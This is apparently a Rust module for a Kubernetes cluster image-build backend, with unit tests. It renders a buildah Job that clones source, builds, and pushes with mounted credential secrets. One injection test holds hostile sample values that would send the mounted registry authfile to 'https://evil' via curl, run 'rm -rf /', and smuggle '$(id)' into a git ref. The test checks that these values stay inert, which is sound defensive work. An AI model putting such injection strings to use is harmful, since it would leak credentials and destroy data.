//! The cluster declarative-build backend. `Cluster` renders a detached rootless-buildah Job and drives
//! it to completion; the `GithubActions` backend lives in [`crate::github`]. A backend's only job is to
//! build + push to the tag it's given; crucible resolves the digest itself from the registry via
//! [`crate::oci::pin_digest`], so nothing ever travels back through Job logs.
//!
//! The Job clones its own source (an initContainer `git clone`), builds `containerfile` against
//! `context`, and pushes with a mounted authfile secret that is owner-ref'd to the Job so a
//! TTL-reap of the Job cascades the credential away. We do NOT read the digest out of the Job.
//!
//! ```text
//!   initContainer(clone) ─▶ /workspace/src (git clone <url>; git checkout <ref>)
//!   container(build)     ─▶ buildah bud -f <containerfile> <context>  ─▶  buildah push  ─▶ image:tag
//!   (Job succeeds) ─▶ caller: pin_digest(image:tag) ─▶ image@sha256:…
//! ```

use crate::kube::{self, JobResult};
use crate::oci;
use anyhow::{Context, Result, bail};
use k8s_openapi::api::batch::v1::{Job, JobSpec};
use k8s_openapi::api::core::v1 as core;
use k8s_openapi::apimachinery::pkg::apis::meta::v1::ObjectMeta;
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::time::Duration;

/// Default rootless-buildah builder image. Overridable per dispatch (the CLI reads `FORGE_BUILDER_IMAGE`).
pub const DEFAULT_BUILDER_IMAGE: &str = "quay.io/buildah/stable:latest";
/// Default git-clone initContainer image (`FORGE_GIT_IMAGE`).
pub const DEFAULT_GIT_IMAGE: &str = "alpine/git:latest";
/// Default TTL after a finished Job (`ttlSecondsAfterFinished`): reap fast, but leave a window to
/// read the build log on failure.
pub const DEFAULT_TTL_SECONDS: i32 = 900;

const SRC_DIR: &str = "/workspace/src";
const AUTH_DIR: &str = "/auth";
/// Where the optional git-clone token secret mounts (read-only) inside the CLONE init container.
const GIT_AUTH_DIR: &str = "/git-auth";
/// The key inside the git-token secret (and its filename under [`GIT_AUTH_DIR`]).
const GIT_TOKEN_KEY: &str = "token";
const BUILD_CONTAINER: &str = "build";
const CLONE_CONTAINER: &str = "clone";

/// A resolved cluster build: everything the Job needs, with no manifest/template indirection left.
/// Built by the caller (the `crucible build` CLI in M0, the controller in M1) from the spec + env.
#[derive(Debug, Clone)]
pub struct ClusterBuildRequest {
    /// The `[build.<name>]` name; resource names + labels derive from it.
    pub name: String,
    /// Destination repository WITHOUT a tag, e.g. `ghcr.io/example/app-sandbox`.
    pub image: String,
    /// The tag to push (the digest, resolved after success, is what consumers pin to).
    pub tag: String,
    /// Containerfile path relative to the cloned source root.
    pub containerfile: String,
    /// Build context dir relative to the cloned source root.
    pub context: String,
    /// buildah `--platform`, e.g. `linux/amd64`.
    pub platform: String,
    /// Git source the initContainer clones.
    pub git_url: String,
    /// Git ref checked out after clone (branch, tag, or full SHA).
    pub git_ref: String,
    /// Namespace the Job runs in.
    pub namespace: String,
    /// Correlation id; uniquifies the Job + secret names and rides a label.
    pub correlation_id: String,
    /// Rootless-buildah builder image.
    pub builder_image: String,
    /// git-clone initContainer image.
    pub git_image: String,
    /// `ttlSecondsAfterFinished`.
    pub ttl_seconds: i32,
    /// Wall-clock cap on the wait (from the spec's `timeout`).
    pub timeout: Duration,
    /// Optional controller-side git token FILE (a path, never the token value). When set, a per-Job
    /// secret is seeded from its bytes and mounted read-only into the CLONE container, which
    /// authenticates via a `GIT_ASKPASS` helper reading the mounted file, so the token never rides
    /// argv/`ps`/logs. `None` ⇒ anonymous clone (public repos).
    pub git_token_file: Option<PathBuf>,
}

impl ClusterBuildRequest {
    /// The Job (and owner) name: `crucible-build-<name>-<correlation>`, DNS-1123 sanitized.
    pub fn job_name(&self) -> String {
        let raw = format!("crucible-build-{}-{}", self.name, self.correlation_id);
        sanitize_dns1123(&raw)
    }

    /// The push-secret name mounted into the Job (owner-ref'd to it).
    fn secret_name(&self) -> String {
        sanitize_dns1123(&format!("{}-push", self.job_name()))
    }

    /// The git-token secret name mounted into the CLONE container (owner-ref'd to the Job), when a
    /// clone token is configured.
    fn git_secret_name(&self) -> String {
        sanitize_dns1123(&format!("{}-git", self.job_name()))
    }

    /// The full `image:tag` the Job pushes.
    pub fn image_ref(&self) -> String {
        format!("{}:{}", self.image, self.tag)
    }
}

/// The result of a successful cluster build: the pushed `image:tag` and the digest-pinned ref the
/// caller resolved from the registry (the source of truth for both backends).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BuildSuccess {
    pub(crate) image_ref: String,
    pub digest_ref: String,
}

/// Render the detached build Job (pure, no cluster contact), so it's unit-testable off the returned
/// k8s object. An initContainer clones + checks out the source into a shared emptyDir; the buildah
/// container builds and pushes with the mounted authfile. `restartPolicy: Never` + `backoffLimit: 0`:
/// a build failure surfaces once with its log, it does not retry-storm.
fn render_job(req: &ClusterBuildRequest) -> Job {
    let job_name = req.job_name();
    let image_ref = req.image_ref();

    let labels = BTreeMap::from([
        (
            "app.kubernetes.io/managed-by".to_string(),
            "crucible".to_string(),
        ),
        ("crucible/build".to_string(), sanitize_dns1123(&req.name)),
        (
            "crucible/correlation".to_string(),
            sanitize_dns1123(&req.correlation_id),
        ),
    ]);

    // AppArmor blocks rootless mount syscalls on stock Ubuntu nodes; `unconfined` on the build
    // container unblocks buildah's user-namespace mounts (buildit's hard-won fix). Keyed by container.
    let pod_annotations = BTreeMap::from([(
        format!("container.apparmor.security.beta.kubernetes.io/{BUILD_CONTAINER}"),
        "unconfined".to_string(),
    )]);

    let source_mount = core::VolumeMount {
        name: "source".to_string(),
        mount_path: SRC_DIR.to_string(),
        ..Default::default()
    };
    let auth_mount = core::VolumeMount {
        name: "push-auth".to_string(),
        mount_path: AUTH_DIR.to_string(),
        read_only: Some(true),
        ..Default::default()
    };

    // The clone container mounts the source emptyDir, plus (only when a clone token is configured)
    // the read-only git-token secret. The token file's presence flips the script to authenticated mode.
    let with_git_auth = req.git_token_file.is_some();
    let mut clone_mounts = vec![source_mount.clone()];
    if with_git_auth {
        clone_mounts.push(core::VolumeMount {
            name: "git-auth".to_string(),
            mount_path: GIT_AUTH_DIR.to_string(),
            read_only: Some(true),
            ..Default::default()
        });
    }

    // Agent-influenced values (git url/ref, platform, containerfile, context, image ref) are passed as
    // distinct argv positional parameters ($1, $2, …) to a STATIC script body, never concatenated into
    // the script text, so a value like `. ; curl … #` can't be reinterpreted by the shell. `$0` is a
    // label for diagnostics only.
    let clone = core::Container {
        name: CLONE_CONTAINER.to_string(),
        image: Some(req.git_image.clone()),
        command: Some(vec!["/bin/sh".to_string(), "-c".to_string()]),
        args: Some(vec![
            clone_script(with_git_auth),
            "crucible-clone".to_string(),
            req.git_url.clone(),
            req.git_ref.clone(),
        ]),
        volume_mounts: Some(clone_mounts),
        ..Default::default()
    };

    let build = core::Container {
        name: BUILD_CONTAINER.to_string(),
        image: Some(req.builder_image.clone()),
        command: Some(vec!["/bin/sh".to_string(), "-c".to_string()]),
        args: Some(vec![
            build_script(),
            "crucible-build".to_string(),
            req.platform.clone(),
            req.containerfile.clone(),
            image_ref.clone(),
            req.context.clone(),
        ]),
        env: Some(vec![core::EnvVar {
            // Force rootless chroot isolation + vfs storage (no privilege, no overlay on emptyDir).
            name: "BUILDAH_ISOLATION".to_string(),
            value: Some("chroot".to_string()),
            value_from: None,
        }]),
        volume_mounts: Some(vec![source_mount, auth_mount]),
        ..Default::default()
    };

    let mut volumes = vec![
        core::Volume {
            name: "source".to_string(),
            empty_dir: Some(core::EmptyDirVolumeSource::default()),
            ..Default::default()
        },
        core::Volume {
            name: "push-auth".to_string(),
            secret: Some(core::SecretVolumeSource {
                secret_name: Some(req.secret_name()),
                ..Default::default()
            }),
            ..Default::default()
        },
    ];
    if with_git_auth {
        volumes.push(core::Volume {
            name: "git-auth".to_string(),
            secret: Some(core::SecretVolumeSource {
                secret_name: Some(req.git_secret_name()),
                ..Default::default()
            }),
            ..Default::default()
        });
    }

    let pod_spec = core::PodSpec {
        restart_policy: Some("Never".to_string()),
        init_containers: Some(vec![clone]),
        containers: vec![build],
        volumes: Some(volumes),
        ..Default::default()
    };

    Job {
        metadata: ObjectMeta {
            name: Some(job_name),
            namespace: Some(req.namespace.clone()),
            labels: Some(labels.clone()),
            ..Default::default()
        },
        spec: Some(JobSpec {
            backoff_limit: Some(0),
            // Kubernetes-side wall-clock cap: a pod wedged Pending (ImagePullBackOff) never finishes,
            // so ttlSecondsAfterFinished (which only reaps FINISHED jobs) can't reclaim it. The
            // deadline fails the Job so it (and its pod) become reap-eligible even when wedged.
            active_deadline_seconds: Some(active_deadline_seconds(req.timeout)),
            ttl_seconds_after_finished: Some(req.ttl_seconds),
            template: core::PodTemplateSpec {
                metadata: Some(ObjectMeta {
                    labels: Some(labels),
                    annotations: Some(pod_annotations),
                    ..Default::default()
                }),
                spec: Some(pod_spec),
            },
            ..Default::default()
        }),
        ..Default::default()
    }
}

/// The initContainer clone script: a full clone (not shallow) so an arbitrary ref (branch, tag, or
/// SHA) checks out; `set -eu` fails the Job on any git error. The static body references url/ref only
/// as positional parameters (`"$1"`, `"$2"`), so no agent-influenced value is ever spliced into shell
/// text. With `with_git_auth`, a `GIT_ASKPASS` helper reads the token from the mounted secret file at
/// request time; the token never appears in any argv or the Job log; the helper strips trailing
/// newlines a secret file may carry.
fn clone_script(with_git_auth: bool) -> String {
    let auth_preamble = if with_git_auth {
        format!(
            "cat > /tmp/git-askpass <<'ASKPASS_EOF'\n\
             #!/bin/sh\n\
             case \"$1\" in\n\
             Username*) printf '%s' 'x-access-token' ;;\n\
             *) tr -d '\\r\\n' < {GIT_AUTH_DIR}/{GIT_TOKEN_KEY} ;;\n\
             esac\n\
             ASKPASS_EOF\n\
             chmod +x /tmp/git-askpass\n\
             export GIT_ASKPASS=/tmp/git-askpass\n\
             export GIT_TERMINAL_PROMPT=0\n"
        )
    } else {
        String::new()
    };
    format!(
        "set -eu\n\
         {auth_preamble}\
         git clone -- \"$1\" {SRC_DIR}\n\
         cd {SRC_DIR}\n\
         git checkout \"$2\" --\n"
    )
}

/// The buildah build+push script, run in the cloned source root. vfs storage + chroot isolation keep
/// it unprivileged. Both `bud` and `push` use the mounted authfile (a private `FROM` needs it to pull);
/// the digest is resolved by the caller after. Static body; platform/containerfile/image/context arrive
/// as positional parameters (`"$1"`..`"$4"`), never concatenated into the script.
fn build_script() -> String {
    format!(
        "set -eu\n\
         cd {SRC_DIR}\n\
         buildah --storage-driver vfs bud --platform \"$1\" --authfile {AUTH_DIR}/config.json -f \"$2\" -t \"$3\" \"$4\"\n\
         buildah --storage-driver vfs push --authfile {AUTH_DIR}/config.json \"$3\"\n"
    )
}

/// The Job's `activeDeadlineSeconds` from the spec timeout, clamped to `>= 1` and to `i64` range so a
/// sub-second or absurdly large timeout can't render an invalid (`0`/overflowed) deadline.
fn active_deadline_seconds(timeout: Duration) -> i64 {
    timeout.as_secs().clamp(1, i64::MAX as u64) as i64
}

/// Dispatch a cluster build and drive it to completion: render the Job, create it, owner-ref the
/// push secret to it (so cleanup cascades), wait, and, on success, resolve the digest-pinned ref
/// from the registry. On failure, the build-log tail rides the error as evidence. `authfile` is the
/// local docker `config.json` whose bytes seed the in-cluster push secret.
pub fn dispatch_cluster(req: &ClusterBuildRequest, authfile: &Path) -> Result<BuildSuccess> {
    let config_json = std::fs::read_to_string(authfile)
        .with_context(|| format!("reading push authfile {}", authfile.display()))?;

    let job = render_job(req);
    let job_name = req.job_name();
    let uid = kube::create_job(&kube::KubeTarget::Ambient, &req.namespace, &job)?;
    kube::create_build_secret(
        &req.namespace,
        &req.secret_name(),
        &job_name,
        &uid,
        "config.json",
        &config_json,
    )?;
    // Optional private-repo clone auth: seed a per-Job secret from the controller-side token file so
    // the CLONE container's GIT_ASKPASS helper can read it. Owner-ref'd to the Job (same as push), so
    // a TTL-reap cascades it away. Absent ⇒ anonymous clone (no secret, no mount).
    if let Some(token_file) = req.git_token_file.as_deref() {
        let token = std::fs::read_to_string(token_file)
            .with_context(|| format!("reading git clone token file {}", token_file.display()))?;
        kube::create_build_secret(
            &req.namespace,
            &req.git_secret_name(),
            &job_name,
            &uid,
            GIT_TOKEN_KEY,
            &token,
        )?;
    }

    match kube::wait_for_job(
        &kube::KubeTarget::Ambient,
        &req.namespace,
        &job_name,
        req.timeout,
    )? {
        JobResult::Succeeded => {
            let image_ref = req.image_ref();
            let digest_ref = oci::pin_digest(&image_ref, Some(authfile))
                .with_context(|| format!("resolving the pushed digest for {image_ref}"))?;
            Ok(BuildSuccess {
                image_ref,
                digest_ref,
            })
        }
        JobResult::Failed => {
            let log = kube::job_logs(
                &kube::KubeTarget::Ambient,
                &req.namespace,
                &job_name,
                BUILD_CONTAINER,
                Some(200),
            )
            .unwrap_or_default();
            bail!(
                "build Job {job_name} failed (namespace {}). Build log tail:\n{log}",
                req.namespace
            )
        }
        JobResult::TimedOut => {
            // Reap the wedged Job (and its pod) so it can't hold cluster resources past the deadline.
            // TTL only reaps FINISHED jobs, and a Pending pod never finishes on its own.
            let log = kube::job_logs(
                &kube::KubeTarget::Ambient,
                &req.namespace,
                &job_name,
                BUILD_CONTAINER,
                Some(200),
            )
            .unwrap_or_default();
            if let Err(e) = kube::delete_job(&kube::KubeTarget::Ambient, &req.namespace, &job_name)
            {
                eprintln!("warning: failed to delete timed-out build Job {job_name}: {e:#}");
            }
            bail!(
                "build Job {job_name} did not finish within {}s (namespace {}); the Job was deleted. \
                 Build log tail:\n{log}",
                req.timeout.as_secs(),
                req.namespace
            )
        }
    }
}

/// Lower-case + collapse to DNS-1123 (`[a-z0-9-]`, no leading/trailing `-`, <= 63 chars) so a build
/// name / correlation id is always a legal k8s object name.
fn sanitize_dns1123(s: &str) -> String {
    let mut out: String = s
        .chars()
        .map(|c| {
            let c = c.to_ascii_lowercase();
            if c.is_ascii_alphanumeric() || c == '-' {
                c
            } else {
                '-'
            }
        })
        .collect();
    out.truncate(63);
    let trimmed = out.trim_matches('-').to_string();
    if trimmed.is_empty() {
        "build".to_string()
    } else {
        trimmed
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn req() -> ClusterBuildRequest {
        ClusterBuildRequest {
            name: "app-sandbox".into(),
            image: "ghcr.io/example/app-sandbox".into(),
            tag: "abc123".into(),
            containerfile: "packs/alpha/Containerfile.sandbox".into(),
            context: ".".into(),
            platform: "linux/amd64".into(),
            git_url: "https://github.com/neuralmagic/crucible".into(),
            git_ref: "main".into(),
            namespace: "example-ns".into(),
            correlation_id: "cid7".into(),
            builder_image: DEFAULT_BUILDER_IMAGE.into(),
            git_image: DEFAULT_GIT_IMAGE.into(),
            ttl_seconds: DEFAULT_TTL_SECONDS,
            timeout: Duration::from_secs(1800),
            git_token_file: None,
        }
    }

    #[test]
    fn job_and_secret_names_are_dns_safe_and_stable() {
        let r = req();
        assert_eq!(r.job_name(), "crucible-build-app-sandbox-cid7");
        assert_eq!(r.secret_name(), "crucible-build-app-sandbox-cid7-push");
        assert_eq!(r.image_ref(), "ghcr.io/example/app-sandbox:abc123");
    }

    #[test]
    fn sanitize_handles_uppercase_and_bad_chars() {
        assert_eq!(sanitize_dns1123("Foo/Bar_Baz"), "foo-bar-baz");
        assert_eq!(sanitize_dns1123("--x--"), "x");
        assert_eq!(sanitize_dns1123("###"), "build");
        assert_eq!(sanitize_dns1123(&"a".repeat(80)).len(), 63);
    }

    #[test]
    fn rendered_job_is_detached_and_reaps() {
        let job = render_job(&req());
        let spec = job.spec.as_ref().unwrap();
        assert_eq!(
            spec.backoff_limit,
            Some(0),
            "no retry storm on a build failure"
        );
        assert_eq!(spec.ttl_seconds_after_finished, Some(DEFAULT_TTL_SECONDS));
        // The wall-clock cap (≈ the spec timeout) reaps a Job wedged Pending, which TTL can't.
        assert_eq!(spec.active_deadline_seconds, Some(1800));
        let pod = spec.template.spec.as_ref().unwrap();
        assert_eq!(pod.restart_policy.as_deref(), Some("Never"));
        assert_eq!(
            job.metadata.name.as_deref(),
            Some("crucible-build-app-sandbox-cid7")
        );
        assert_eq!(job.metadata.namespace.as_deref(), Some("example-ns"));
    }

    #[test]
    fn active_deadline_is_clamped_to_at_least_one_second() {
        assert_eq!(active_deadline_seconds(Duration::from_millis(10)), 1);
        assert_eq!(active_deadline_seconds(Duration::from_secs(42)), 42);
    }

    /// The clone/build container argv, split into (script_body, positional_params). Asserts the
    /// caller-supplied values ride as distinct positional argv elements, never spliced into the body.
    fn container_argv(c: &core::Container) -> (String, Vec<String>) {
        assert_eq!(
            c.command.as_deref(),
            Some(&["/bin/sh".to_string(), "-c".to_string()][..])
        );
        let args = c.args.as_ref().unwrap();
        let script = args.first().unwrap().clone();
        let positionals = args[1..].to_vec();
        (script, positionals)
    }

    #[test]
    fn init_container_clones_and_build_container_pushes() {
        let job = render_job(&req());
        let pod = job.spec.unwrap().template.spec.unwrap();

        let clone = pod.init_containers.as_ref().unwrap().first().unwrap();
        assert_eq!(clone.name, CLONE_CONTAINER);
        let (clone_script, clone_pos) = container_argv(clone);
        assert!(clone_script.contains("git clone"));
        // The ref-switch form: `git checkout "$2" --` (ref first) actually checks out the ref. The
        // pathspec form `git checkout -- "$2"` treats the ref as a file to restore, so no ref is ever
        // switched to and a non-default ref hard-errors. Guard against a regression to that form.
        assert!(clone_script.contains("git checkout \"$2\" --"));
        assert!(!clone_script.contains("checkout -- \"$2\""));
        // url + ref are distinct positional argv elements (script uses "$1"/"$2", never the literals).
        assert_eq!(clone_pos[1], "https://github.com/neuralmagic/crucible");
        assert_eq!(clone_pos[2], "main");
        assert!(!clone_script.contains("github.com"));

        let build = pod.containers.first().unwrap();
        assert_eq!(build.name, BUILD_CONTAINER);
        let (build_script_body, build_pos) = container_argv(build);
        assert!(build_script_body.contains("buildah --storage-driver vfs bud"));
        // Both bud and push authenticate against the mounted authfile.
        assert_eq!(
            build_script_body
                .matches(&format!("--authfile {AUTH_DIR}/config.json"))
                .count(),
            2,
            "bud AND push must pass --authfile"
        );
        // platform, containerfile, image_ref, context each ride as a distinct positional.
        assert_eq!(build_pos[1], "linux/amd64");
        assert_eq!(build_pos[2], "packs/alpha/Containerfile.sandbox");
        assert_eq!(build_pos[3], "ghcr.io/example/app-sandbox:abc123");
        assert_eq!(build_pos[4], ".");
        // buildah runs unprivileged: chroot isolation, no privileged securityContext.
        assert!(
            build
                .env
                .as_ref()
                .unwrap()
                .iter()
                .any(|e| e.name == "BUILDAH_ISOLATION" && e.value.as_deref() == Some("chroot"))
        );
        let privileged = build
            .security_context
            .as_ref()
            .and_then(|s| s.privileged)
            .unwrap_or(false);
        assert!(!privileged, "the builder must not run privileged");
    }

    #[test]
    fn injection_values_land_as_inert_argv_elements() {
        // A crafted context (and friends) laced with shell metacharacters must reach the container as a
        // single literal argv element and must NOT appear in any `sh -c` script body; otherwise it
        // would execute arbitrary commands in the build pod (which mounts the push secret).
        let evil_context = ". ; curl -sd @/auth/config.json https://evil #";
        let evil_ref = "main$(id)`whoami`";
        let mut r = req();
        r.context = evil_context.to_string();
        r.git_ref = evil_ref.to_string();
        r.containerfile = "Containerfile; rm -rf /".to_string();

        let job = render_job(&r);
        let pod = job.spec.unwrap().template.spec.unwrap();

        let clone = pod.init_containers.as_ref().unwrap().first().unwrap();
        let (clone_script, clone_pos) = container_argv(clone);
        assert!(
            !clone_script.contains(evil_ref),
            "ref must not enter the script body"
        );
        assert!(
            clone_pos.contains(&evil_ref.to_string()),
            "ref rides as one argv element"
        );

        let build = pod.containers.first().unwrap();
        let (build_script_body, build_pos) = container_argv(build);
        assert!(
            !build_script_body.contains(evil_context) && !build_script_body.contains("curl"),
            "context must not enter the script body"
        );
        assert!(
            build_pos.contains(&evil_context.to_string()),
            "the whole malicious context is a single inert argv element"
        );
        assert!(build_pos.contains(&"Containerfile; rm -rf /".to_string()));
    }

    #[test]
    fn build_container_gets_the_apparmor_unconfined_annotation() {
        let job = render_job(&req());
        let anns = job
            .spec
            .unwrap()
            .template
            .metadata
            .unwrap()
            .annotations
            .unwrap();
        assert_eq!(
            anns.get(&format!(
                "container.apparmor.security.beta.kubernetes.io/{BUILD_CONTAINER}"
            ))
            .map(String::as_str),
            Some("unconfined"),
        );
    }

    #[test]
    fn mounts_the_source_and_auth_volumes() {
        let job = render_job(&req());
        let pod = job.spec.unwrap().template.spec.unwrap();
        let vols = pod.volumes.as_ref().unwrap();
        assert!(
            vols.iter()
                .any(|v| v.name == "source" && v.empty_dir.is_some())
        );
        let auth = vols.iter().find(|v| v.name == "push-auth").unwrap();
        assert_eq!(
            auth.secret.as_ref().unwrap().secret_name.as_deref(),
            Some("crucible-build-app-sandbox-cid7-push"),
        );
    }

    #[test]
    fn without_a_git_token_the_clone_is_anonymous_and_unchanged() {
        // Default request (no token): the CLONE container mounts ONLY the source volume, there is no
        // git-auth volume, and the script does no auth (no GIT_ASKPASS, no token path).
        let job = render_job(&req());
        let pod = job.spec.unwrap().template.spec.unwrap();

        let clone = pod.init_containers.as_ref().unwrap().first().unwrap();
        let mounts = clone.volume_mounts.as_ref().unwrap();
        assert_eq!(mounts.len(), 1, "clone mounts only the source volume");
        assert_eq!(mounts[0].name, "source");

        let (clone_script, _) = container_argv(clone);
        assert!(!clone_script.contains("GIT_ASKPASS"));
        assert!(!clone_script.contains(GIT_AUTH_DIR));

        assert!(
            !pod.volumes
                .as_ref()
                .unwrap()
                .iter()
                .any(|v| v.name == "git-auth"),
            "no git-auth volume when no token configured"
        );
    }

    #[test]
    fn with_a_git_token_the_clone_container_mounts_the_secret_and_authenticates_via_file() {
        // The token FILE path is controller-side config (never the token value). The rendered Job must
        // reference it only through the mounted secret + a file read; the token value is not in the
        // request at all, so trivially not in the Job; assert the machinery is present + safe.
        let mut r = req();
        r.git_token_file = Some(PathBuf::from("/var/run/secrets/build-git/token"));
        let job = render_job(&r);
        let pod = job.spec.unwrap().template.spec.unwrap();

        // The CLONE container gains a read-only git-auth mount at GIT_AUTH_DIR (source still present).
        let clone = pod.init_containers.as_ref().unwrap().first().unwrap();
        let mounts = clone.volume_mounts.as_ref().unwrap();
        assert!(mounts.iter().any(|m| m.name == "source"));
        let git = mounts
            .iter()
            .find(|m| m.name == "git-auth")
            .expect("git-auth mount");
        assert_eq!(git.mount_path, GIT_AUTH_DIR);
        assert_eq!(git.read_only, Some(true), "clone token mount is read-only");

        // A git-auth secret volume, owner-ref'd per-Job name, backs the mount.
        let git_vol = pod
            .volumes
            .as_ref()
            .unwrap()
            .iter()
            .find(|v| v.name == "git-auth")
            .expect("git-auth volume");
        assert_eq!(
            git_vol.secret.as_ref().unwrap().secret_name.as_deref(),
            Some("crucible-build-app-sandbox-cid7-git"),
        );

        // The script authenticates by reading the MOUNTED FILE via a GIT_ASKPASS helper, never by
        // putting a token on argv. It references the mounted path, sets GIT_ASKPASS, and the clone
        // still rides url/ref as positionals.
        let (clone_script, clone_pos) = container_argv(clone);
        assert!(clone_script.contains("GIT_ASKPASS"));
        assert!(clone_script.contains(&format!("{GIT_AUTH_DIR}/{GIT_TOKEN_KEY}")));
        assert!(clone_script.contains("git clone"));
        assert_eq!(clone_pos[1], "https://github.com/neuralmagic/crucible");
        assert_eq!(clone_pos[2], "main");
    }

    #[test]
    fn the_git_token_path_and_value_never_reach_the_job_argv() {
        // Even the controller-side FILE PATH must not leak into any container argv/command (the Job
        // only names the derived secret + the fixed in-container mount path); the token value can't
        // leak because it isn't in the request. Scan every container's command+args exhaustively.
        let secret_path = "/var/run/secrets/build-git/token";
        let mut r = req();
        r.git_token_file = Some(PathBuf::from(secret_path));
        let job = render_job(&r);
        let pod = job.spec.unwrap().template.spec.unwrap();

        let mut argv: Vec<String> = Vec::new();
        for c in pod
            .init_containers
            .iter()
            .flatten()
            .chain(pod.containers.iter())
        {
            argv.extend(c.command.iter().flatten().cloned());
            argv.extend(c.args.iter().flatten().cloned());
        }
        assert!(
            argv.iter().all(|a| !a.contains(secret_path)),
            "the controller-side token file path must never enter container argv"
        );
    }
}
